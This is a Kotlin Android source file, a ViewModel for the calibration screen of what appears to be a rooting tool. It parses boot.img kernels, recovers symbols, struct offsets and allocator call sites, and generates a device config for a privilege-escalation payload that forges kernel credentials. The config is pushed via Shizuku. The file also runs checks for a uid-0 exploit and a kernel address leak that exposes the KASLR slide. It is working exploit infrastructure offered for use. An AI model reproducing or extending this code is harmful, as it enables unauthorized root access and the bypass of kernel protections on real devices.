package com.extractkit.app

import android.app.Application
import android.content.ContentResolver
import android.content.Intent
import android.net.Uri
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateListOf
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.setValue
import androidx.lifecycle.AndroidViewModel
import androidx.lifecycle.viewModelScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.io.File
import java.io.FileInputStream

/** 十六进制输入：空 / 非法都回退到 fallback（与旧版 num(EditText) 行为一致）。 */
/** 日志环形缓冲：超过 [max] 行就丢最旧的（纯函数，便于单测）。 */
internal fun ringAppend(lines: MutableList<String>, line: String, max: Int) {
    lines.add(line)
    while (lines.size > max) lines.removeAt(0)
}

/** 组 profile 的纯函数部分：不碰 Android，方便单测。 */
internal fun assembleProfile(
    release: String,
    syms: Map<String, Long>,
    off: Offsets,
    measured: ConfigGen.Measured,
    timerAbs: Long?,
    credAbs: Long?,
    timerFallback: Int,
): ConfigGen.Profile {
    val rel = if (release == "?" || release.isBlank()) ConfigGen.Baseline.release else release
    val need = ConfigGen.REQUIRED_SYMBOLS.mapNotNull { n -> syms[n]?.let { n to it } }.toMap()
    return ConfigGen.Profile(
        name = rel.take(48),
        prefix = rel,
        release = rel,
        symbols = need,
        offsets = off,
        measured = measured,
        timerLink = timerAbs ?: ((syms["do_timer_create"] ?: 0L) + timerFallback),
        credLink = credAbs ?: 0L,
    )
}

internal fun parseHex(raw: String?, fallback: Int): Int {
    val text = raw?.trim().orEmpty()
    if (text.isEmpty()) return fallback
    return text.removePrefix("0x").removePrefix("0X").toIntOrNull(16) ?: fallback
}

/**
 * 标定页的全部逻辑：解析 boot.img → 出 offsets / 符号表 / call site → 组 profile → 存/分享/下发。
 *
 * 以前这些状态挂在 8 个 View 上（EditText/TextView/MaterialCardView），旋转一次就全丢；
 * 现在放在 ViewModel 里，界面只读状态。
 */
class CalibrationModel(app: Application) : AndroidViewModel(app) {

    var kernel by mutableStateOf("未解析"); private set
    var btfLabel by mutableStateOf("未解析"); private set
    var symsLabel by mutableStateOf("未解析"); private set
    var busy by mutableStateOf(false); private set
    var ready by mutableStateOf(false); private set
    var canSave by mutableStateOf(false); private set
    /** 标定结论：能不能直接提权，不能的原因是什么。 */
    var verdict by mutableStateOf<String?>(null); private set
    var verdictOk by mutableStateOf(false); private set
    var showAdvanced by mutableStateOf(false); private set

    var advTimer by mutableStateOf<String?>(null)
    var advCred by mutableStateOf<String?>(null)
    var advTask by mutableStateOf<String?>(null)
    var advTaskBytes by mutableStateOf<String?>(null)

    val logLines = mutableStateListOf<String>()
    var message by mutableStateOf<String?>(null)
    var shareIntent by mutableStateOf<Intent?>(null)

    private var offsets: Offsets? = null
    private var lastCall: CallSiteFinder.Result? = null
    private var btf: Btf? = null
    private var profile: ConfigGen.Profile? = null
    private var savedFile: File? = null
    private var syms: Map<String, Long> = emptyMap()
    private var release = "?"

    private fun log(line: String) {
        line.lineSequence().forEach { l -> ringAppend(logLines, l, MAX_LINES) }
    }

    fun clearLog() {
        logLines.clear()
    }

    fun setAdvanced(timer: String?, cred: String?, task: String?, taskBytes: String?) {
        advTimer = timer
        advCred = cred
        advTask = task
        advTaskBytes = taskBytes
    }

    /** 固件页提取出来的 zip（内含 boot.img）直接交给标定。 */
    fun analyzeZip(resolver: ContentResolver, zip: java.io.File) {
        if (busy) return
        viewModelScope.launch {
            val entry = withContext(Dispatchers.IO) {
                runCatching {
                    java.util.zip.ZipFile(zip).use { z ->
                        val e = z.entries().toList()
                            .firstOrNull { it.name.endsWith("boot.img") }
                            ?: throw IllegalStateException("这个 zip 里没有 boot.img")
                        val out = java.io.File(
                            getApplication<android.app.Application>().filesDir,
                            "extracted-" + e.name.substringAfterLast('/'),
                        )
                        z.getInputStream(e).use { i -> out.outputStream().use { o -> i.copyTo(o) } }
                        out
                    }
                }
            }
            entry.onSuccess { analyze(resolver, Uri.fromFile(it)) }
                .onFailure {
                    fail("标定失败：${it.message}")
                }
        }
    }

    fun analyze(resolver: ContentResolver, uri: Uri) {
        if (busy) return
        busy = true
        ready = false
        canSave = false
        clearLog()
        offsets = null
        lastCall = null
        syms = emptyMap()
        release = "?"
        kernel = "未解析"
        btfLabel = "未解析"
        symsLabel = "未解析"
        showAdvanced = false
        verdict = null
        verdictOk = false

        viewModelScope.launch {
            try {
                log("打开文件…")
                val header = withContext(Dispatchers.IO) { readHeader(resolver, uri) }
                if (header == null || header.size < 64) {
                    fail("标定失败：读不到文件头")
                    return@launch
                }
                val info = try {
                    BootImage.parseHeader(header)
                } catch (e: BootImage.Unsupported) {
                    fail("标定失败：${e.message}")
                    return@launch
                }
                if (info == null) {
                    fail("标定失败：不是可识别的 boot.img（magic 对不上 v0~v4）")
                    return@launch
                }
                log(
                    "boot 头: version=${if (info.headerVersion < 0) "raw Image" else info.headerVersion}" +
                        " kernel=${info.kernelSize / 1024 / 1024} MiB",
                )

                val image = withContext(Dispatchers.IO) { readKernel(resolver, uri, info) }
                if (image == null || image.isEmpty()) {
                    fail("标定失败：切不出 kernel 段")
                    return@launch
                }
                log("kernel 段: ${image.size / 1024 / 1024} MiB")
                release = BootImage.kernelRelease(image) ?: "?"
                log("内核: $release")
                kernel = if (release == "?" || release.isBlank()) "已解析（无版本串）" else release

                // ---- BTF
                log("找内嵌 BTF…")
                val btfBytes = withContext(Dispatchers.IO) { BootImage.extractBtf(image) }
                if (btfBytes == null) {
                    log("! 镜像里没有 BTF（这版内核可能裁掉了）")
                } else {
                    log("BTF: ${btfBytes.size / 1024} KiB")
                    runCatching { Btf.parse(btfBytes) }.onSuccess { parsed ->
                        btf = parsed
                        runCatching { ConfigGen.offsetsFromBtf(parsed) }.onSuccess { off ->
                            offsets = off
                            log(off.pretty())
                            btfLabel = "已解析"
                            val ts = parsed.sizeOf("task_struct")
                            val ki = parsed.sizeOf("k_itimer")
                            log(
                                "sizeof  task_struct=${ts?.let { "0x" + Integer.toHexString(it) } ?: "?"}" +
                                    "  k_itimer=${ki?.let { "0x" + Integer.toHexString(it) } ?: "?"}" +
                                    "（尺寸来自 BTF，换内核自动跟着变）",
                            )
                            if (off.credUid != 8) {
                                log("! cred.uid=${off.credUid}：payload 假设 uid@8，换 KMI 要改 build_fake_cred()")
                            }
                        }.onFailure { log("! BTF 结构体缺失：${it.message}") }
                    }.onFailure { log("! BTF 解析失败：${it.message}") }
                }

                // ---- kallsyms
                log("扫描 kallsyms（约 5~20 秒）…")
                val found = withContext(Dispatchers.IO) {
                    KallsymsFinder.find(image) { msg -> log(msg) }
                }
                if (found == null) {
                    log("! 没扫到 kallsyms")
                    log("  目前只支持 6.4+ 的 BASE_RELATIVE 布局；")
                    log("  5.10 / 5.15 / 6.1 这些更早的内核是另一套布局（绝对地址表），用的是 legacy 回溯")
                    log("  另外这代内核 cred.uid 是 +4（不是 +8），payload 也需要配套改")
                    fail("标定失败：扫不到符号表（这版内核布局还没适配）")
                } else {
                    syms = found.symbols
                    symsLabel = "${syms.size} 个符号"
                    log("符号 ${syms.size} 个，relative_base=0x${java.lang.Long.toHexString(found.relativeBase)}")
                    if (offsets == null) {
                        log("镜像没有 BTF，改从指令里挖结构偏移…")
                        runCatching { ConfigGen.offsetsFromCode(image, syms, found.relativeBase) }
                            .onSuccess { off ->
                                if (off == null) {
                                    log("! 指令里也没挖到（init_posix_timers / cred_init / fork_init / exit_creds 任一没命中）")
                                } else {
                                    offsets = off
                                    log(off.pretty())
                                    log("（来源：kmem_cache_create 的 sizeof 参数 + exit_creds 清 cred 的 STR XZR）")
                                }
                            }
                            .onFailure { log("! 指令解析失败：${it.message}") }
                    }
                    val missing = ConfigGen.REQUIRED_SYMBOLS.filter { (syms[it] ?: 0L) == 0L }
                    runCatching { CallSiteFinder.find(image, syms, found.relativeBase) }
                        .getOrNull()
                        ?.let { cs ->
                            lastCall = cs
                            advTimer = "0x" + Integer.toHexString(cs.timerOffset)
                            advCred = "0x" + Integer.toHexString(cs.credLow21)
                            advTask = "0x" + Integer.toHexString(cs.taskLow21)
                            log("✓ call site 自动算出（反汇编 bl kmem_cache_alloc*）：")
                            cs.detail.forEach { log("   $it") }
                        }
                        ?: run {
                            showAdvanced = true
                            log("! call site 没算出来，已展开「高级」可手填")
                            fail("漏洞已修复或不支持：找不到 kmem_cache_alloc 调用点")
                        }

                    if (missing.isEmpty()) {
                        log("✓ 7 个必需符号齐全")
                        ConfigGen.REQUIRED_SYMBOLS.forEach { name ->
                            log("   ${name.padEnd(18)} 0x${java.lang.Long.toHexString(syms[name]!!)}")
                        }
                    } else {
                        log("! 缺符号：${missing.joinToString()}")
                    }
                }

                // 解析完就把 profile 组装好，等用户点「保存 profile」
                if (offsets != null && syms.isNotEmpty()) {
                    val p = buildProfile()
                    profile = p
                    evaluate(p)
                    ready = verdictOk && p != null
                    canSave = ready
                    if (ready) {
                        log("· 可以「保存 profile」，同内核设备导入后免标定")
                        applyToSoftware()
                    }
                } else {
                    if (verdict == null) fail("标定失败：BTF 偏移或符号表没拿到")
                }
            } finally {
                busy = false
            }
        }
    }

    private fun fail(msg: String) {
        verdict = msg
        verdictOk = false
        log("! $msg")
    }

    /**
     * 标定完必须回答一个问题：这台内核能不能直接提权。
     * 判据与真正跑链时 payload 的要求完全一致 —— 缺一样就当场说清楚，不要等用户点了「开始提权」才失败。
     */
    private fun evaluate(p: ConfigGen.Profile?) {
        if (p == null) {
            fail("标定失败：profile 组不出来")
            return
        }
        val missing = ConfigGen.CORE_SYMBOLS.filter { (p.symbols[it] ?: 0L) == 0L }
        if (missing.isNotEmpty()) {
            fail("标定失败：缺符号 " + missing.joinToString())
            return
        }
        val m2 = p.measured
        if (m2.timerSiteOffset == 0 || m2.credSiteLow21 == 0 || m2.taskAllocLow21 == 0) {
            fail("漏洞已修复或不支持：找不到 kmem_cache_alloc 调用点")
            return
        }
        if (m2.timerSiteOffset < 0 || m2.timerSiteOffset > 0x8000 ||
            m2.credSiteLow21 !in 0 until 0x200000 || m2.taskAllocLow21 !in 0 until 0x200000
        ) {
            fail("标定失败：call site 偏移越界（timer=0x${Integer.toHexString(m2.timerSiteOffset)}）")
            return
        }
        val blob = runCatching { ConfigGen.emitCfgBlob(p.symbols, p.offsets, m2) }
        if (blob.isFailure) {
            fail("标定失败：cfg 生成失败（" + (blob.exceptionOrNull()?.message ?: "未知") + "）")
            return
        }
        val osVer = runCatching { System.getProperty("os.version").orEmpty() }.getOrDefault("")
        val same = osVer.isNotEmpty() && ConfigGen.sameKernel(osVer, p.release)
        verdictOk = true
        verdict = if (same) {
            "✓ 可提权：已生成 device.cfg（${blob.getOrNull()?.size ?: 0} B），可以直接跑"
        } else {
            "⚠ 这份 boot.img 的内核是 " + p.release.take(30) +
                "…，与本机不同；同内核设备可导入后直接跑"
        }
    }

    private fun readHeader(resolver: ContentResolver, uri: Uri): ByteArray? = runCatching {
        resolver.openFileDescriptor(uri, "r")!!.use { pfd ->
            FileInputStream(pfd.fileDescriptor).use { input ->
                val head = ByteArray(4096)
                var read = 0
                while (read < head.size) {
                    val n = input.read(head, read, head.size - read)
                    if (n <= 0) break
                    read += n
                }
                head.copyOf(read)
            }
        }
    }.getOrNull()

    private fun readKernel(resolver: ContentResolver, uri: Uri, info: BootImage.Info): ByteArray? = runCatching {
        resolver.openFileDescriptor(uri, "r")!!.use { pfd ->
            FileInputStream(pfd.fileDescriptor).use { input ->
                BootImage.readKernel(input, info)
            }
        }
    }.getOrNull()

    /** 解析成功后自动执行：生成 device_config.h + device.cfg 并下发（旧版「导入软件」按钮已并入这里）。 */
    private suspend fun applyToSoftware() {
        val off = offsets ?: return
        if (syms.isEmpty()) return
        val ev = if (Shell.connected()) TraceEvents.read { log(it) } else null
        val btfTaskSize = btf?.sizeOf("task_struct")
        val measured = ConfigGen.Measured(
            timerSiteOffset = parseHex(advTimer, 0x94),
            credSiteLow21 = parseHex(advCred, 0x38458),
            taskAllocLow21 = parseHex(advTask, 0x1CB240),
            taskAllocBytes = btfTaskSize ?: parseHex(advTaskBytes, 0x12C0),
            evCacheAlloc = ev?.get(0) ?: 269,
            evCacheFree = ev?.get(1) ?: 272,
            evPageAlloc = ev?.get(2) ?: 275,
            evPageFree = ev?.get(3) ?: 273,
            evPcpuDrain = ev?.get(4) ?: 277,
        )
        if (btfTaskSize != null) log("task 分配大小取自 BTF：0x${Integer.toHexString(btfTaskSize)}")
        val header = runCatching {
            ConfigGen.emitHeader(release, syms, off, measured, "in-app", "in-app")
        }.getOrElse {
            log("! 生成失败：${it.message}")
            return
        }
        val ctx = getApplication<Application>()
        val dir = File(ctx.getExternalFilesDir(null) ?: ctx.filesDir, "config").apply { mkdirs() }
        File(dir, "device_config.h").writeText(header)

        val blob = ConfigGen.emitCfgBlob(syms, off, measured)
        val cfgFile = ConfigGen.cfgFile(ctx)
        cfgFile.writeBytes(blob)
        log("device.cfg: ${blob.size} B → ${cfgFile.absolutePath}")
        if (!Shell.connected()) Shell.connect(ctx)
        val (rc, out) = withContext(Dispatchers.IO) {
            Shell.pushFile("/data/local/tmp/extract-kit/device.cfg", blob, executable = false)
        }
        log(
            if (rc == 0) "✓ 已自动导入软件（device.cfg 已下发）"
            else "! 下发失败：${out.trim()}（下次「开始提权」部署时还会再推一次）",
        )
        ctx.getSharedPreferences("cfg", android.content.Context.MODE_PRIVATE).edit()
            .putString("release", release)
            .putLong("at", System.currentTimeMillis())
            .apply()
        AppState.needsReprobe = true
        log("==== device_config.h （${header.length} B）====")
        header.lineSequence().forEach { log(it) }
        message = "已导入软件：$release"
    }

    /** 用当前解析结果组装一个可保存/分享的 profile。 */
    fun buildProfile(): ConfigGen.Profile? {
        val off = offsets ?: return null
        if (syms.isEmpty()) return null
        val rel = if (release == "?" || release.isBlank()) ConfigGen.Baseline.release else release
        val ev = if (Shell.connected()) TraceEvents.read { } else null
        val measured = ConfigGen.Measured(
            timerSiteOffset = parseHex(advTimer, 0x94),
            credSiteLow21 = parseHex(advCred, 0x38458),
            taskAllocLow21 = parseHex(advTask, 0x1CB240),
            taskAllocBytes = btf?.sizeOf("task_struct") ?: parseHex(advTaskBytes, 0x12C0),
            credReq = off.credSize,
            credAlloc = (off.credSize + 15) / 16 * 16,
            evCacheAlloc = ev?.get(0) ?: 269,
            evCacheFree = ev?.get(1) ?: 272,
            evPageAlloc = ev?.get(2) ?: 275,
            evPageFree = ev?.get(3) ?: 273,
            evPcpuDrain = ev?.get(4) ?: 277,
        )
        return assembleProfile(
            release = rel,
            syms = syms,
            off = off,
            measured = measured,
            timerAbs = lastCall?.timerAbs,
            credAbs = lastCall?.credAbs,
            timerFallback = parseHex(advTimer, 0x94),
        )
    }

    fun saveProfile() {
        val p = profile ?: buildProfile() ?: run { message = "先选 boot.img 解析完"; return }
        val ctx = getApplication<Application>()
        runCatching { ProfileStore.save(ctx, p) }
            .onSuccess {
                savedFile = it
                log("✓ profile 已保存：${it.absolutePath}")
                message = "已保存 profile"
                AppState.needsReprobe = true
            }
            .onFailure { log("! 保存失败：${it.message}") }
    }

    fun importProfile(resolver: ContentResolver, uri: Uri) {
        viewModelScope.launch {
            val text = withContext(Dispatchers.IO) {
                runCatching {
                    resolver.openInputStream(uri)!!.use { it.readBytes().toString(Charsets.UTF_8) }
                }.getOrNull()
            }
            val p = text?.let { runCatching { ProfileStore.parse(it) }.getOrNull() }
            if (p == null) {
                log("! 不是有效的 profile 文件")
                return@launch
            }
            ProfileStore.save(getApplication(), p)
            log("✓ 已导入 profile：${p.name}（内核 ${p.release}）")
            message = "已导入：${p.name}"
            AppState.needsReprobe = true
        }
    }

    fun shareProfile() {
        val ctx = getApplication<Application>()
        val f = savedFile ?: run {
            val p = profile ?: buildProfile() ?: run { message = "先解析 boot.img"; return }
            ProfileStore.save(ctx, p).also { savedFile = it }
        }
        runCatching {
            val uri = androidx.core.content.FileProvider.getUriForFile(ctx, "${ctx.packageName}.files", f)
            shareIntent = Intent.createChooser(
                Intent(Intent.ACTION_SEND).apply {
                    type = "text/plain"
                    putExtra(Intent.EXTRA_STREAM, uri)
                    addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
                },
                "分享 profile",
            )
        }.onFailure { message = "分享失败：$it" }
    }

    /** 98260 的只读自检：不改任何东西，只确认 tracefs + 偏移是否能用（要 Shizuku 授权）。 */
    fun runCheck98260() {
        viewModelScope.launch {
            val ctx = getApplication<Application>()
            log("==== 自检（CVE-2026-98260，默认）====")
            if (!Shell.alive()) {
                log("! 没检测到 Shizuku：先在设备上启动 Shizuku，再给本应用授权")
                message = "需要 Shizuku 授权"
                return@launch
            }
            if (!Shell.granted()) {
                log("! Shizuku 已运行但没有授权：请同意授权框，或回到首页点横幅授权")
                message = "需要 Shizuku 授权"
                return@launch
            }
            message = "自检中…"
            val engine = withContext(Dispatchers.IO) { ExtractEngine(ctx, ::log, { }) }
            val ok = withContext(Dispatchers.IO) { engine.ensureShell() }
            if (!ok) {
                log("! 连接 UserService 失败：${Shell.error() ?: "未知原因"}")
                message = "连接失败"
                return@launch
            }
            val outcome = withContext(Dispatchers.IO) {
                engine.run(Modes.byId("check_uid0"), allowUnmatched = true)
            }
            log("---- 结果：${outcome.stage} · ok=${outcome.ok} ----")
            if (outcome.detail.isNotBlank()) log(outcome.detail)
            message = if (outcome.ok) "环境就绪" else "未就绪"
        }
    }

    fun runLeakCheck() {
        viewModelScope.launch {
            val ctx = getApplication<Application>()
            log("==== 泄露自检（CVE-2026-98937）====")
            if (!Cve98937Leak.deploy(ctx)) {
                log("! 自检程序部署失败")
                message = "部署失败"
                return@launch
            }
            message = "自检中（约 3 秒）"
            val r = withContext(Dispatchers.IO) { Cve98937Leak.run(ctx) }
            r.raw.lineSequence().filter { it.isNotBlank() }.forEach { log(it) }
            log(if (r.vulnerable) "✓ 内核受影响（泄露 ${r.frames} 帧内核调用链）" else "· 内核未受影响（perf 已修）")
            r.slide?.let { log("· 泄露推出的 slide = 0x" + java.lang.Long.toHexString(it)) }
            r.firstKernelIp?.let { log("· 首个内核 ip = 0x" + java.lang.Long.toHexString(it)) }
            message = if (r.vulnerable) "受影响" else "未受影响"
        }
    }

    fun consumeMessage(): String? = message.also { message = null }

    private companion object {
        const val MAX_LINES = 600
    }
}
